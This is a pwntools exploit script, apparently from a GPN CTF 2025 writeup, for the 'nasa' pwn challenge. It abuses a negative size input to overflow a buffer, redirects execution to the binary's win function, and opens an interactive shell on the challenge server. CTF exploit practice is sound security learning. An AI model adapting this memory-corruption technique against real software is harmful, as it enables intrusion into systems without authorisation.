#!/usr/bin/env python3
import sys

from pwn import *

BINARY_PATH = "/ctf-writeups/2025/gpn-ctf/pwn/nasa/dist/nasa"
REMOTE_HOST = "silverbridge-of-preposterous-opportunity.gpn23.ctf.kitctf.de"
REMOTE_PORT = 443

context.binary = BINARY_PATH
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h", "-p 65"]

elf = context.binary

is_remote = len(sys.argv) == 2 and sys.argv[1] == "remote"


def attach(r):
    if is_remote:
        return

    bkps = []
    gdb.attach(r, "\n".join(f"break {x}" for x in bkps))


def exploit(r):
    attach(r)

    payload = flat({
        0x400: elf.bss(),
        0x428: elf.sym.win
    })

    r.sendlineafter(b"Quit\n", b"4")
    r.sendlineafter(b"editing: ", b"0")
    r.sendlineafter(b"overwrite: ", f"{0x800 - (1 << 32)}")
    r.sendline(payload)

    r.sendlineafter(b"Quit\n", b"6")
    r.interactive()


def main():
    if is_remote:
        r = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)
    else:
        r = process(elf.path)

    exploit(r)


if __name__ == "__main__":
    main()
